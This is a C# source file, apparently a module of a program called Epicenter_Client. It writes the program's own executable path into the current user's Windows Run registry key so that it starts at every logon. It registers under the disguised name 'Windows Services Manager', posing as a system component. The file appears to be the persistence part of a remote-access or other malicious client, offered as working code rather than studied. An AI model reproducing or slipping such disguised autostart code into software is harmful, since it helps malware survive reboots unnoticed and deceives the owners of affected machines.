using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Win32;
using System.Windows.Forms;

namespace Epicenter_Client
{
    class RegistryAlteration
    {
        public static bool isPresent()
        {
            RegistryKey masterKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");

            if (masterKey == null)
                return false;
            else
            {
                try
                {
                    object retn = masterKey.GetValue("Windows Services Manager");
                    masterKey.Close();
                    if (retn == null)
                        return false;
                    else
                        return true;
                }
                catch
                {
                    if(masterKey != null)
                        masterKey.Close();
                    return false;
                }
            }
        }

        public static bool AddToStartup()
        {
            RegistryKey masterKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");

            if (masterKey == null)
                return false;
            else
            {
                try
                {
                    masterKey.SetValue("Windows Services Manager", Application.ExecutablePath);
                }
                catch
                {
                    return false;
                }
                finally
                {
                    masterKey.Close();
                }
            }
            return true;
        }

    }
}
